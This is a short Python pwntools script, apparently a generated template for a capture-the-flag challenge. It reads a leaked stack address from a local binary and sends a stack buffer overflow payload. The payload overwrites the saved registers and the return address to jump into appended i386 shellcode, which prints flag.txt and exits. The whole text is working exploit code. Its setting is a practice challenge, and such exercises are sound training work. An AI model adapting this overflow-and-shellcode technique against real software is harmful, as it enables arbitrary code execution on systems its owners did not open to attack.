from pwn import *

gen_filename = ""
gen_templates = {}

e = ELF(gen_filename)
p = e.process()

B = gen_templates["B"]
buff = int(p.readline().strip(), 16)

payload = b""
payload += B * b"a"  # buffer
payload += 4 * b"b"  # ebp
payload += 4 * b"c"  # ebx
payload += 4 * b"d"  # padding
dest = buff + len(payload) + 4
payload += p32(dest)  # eip
shellcode = shellcraft.i386.linux.cat("flag.txt") + shellcraft.i386.linux.exit(0)
payload += asm(shellcode)
p.sendline(payload)

p.stream()
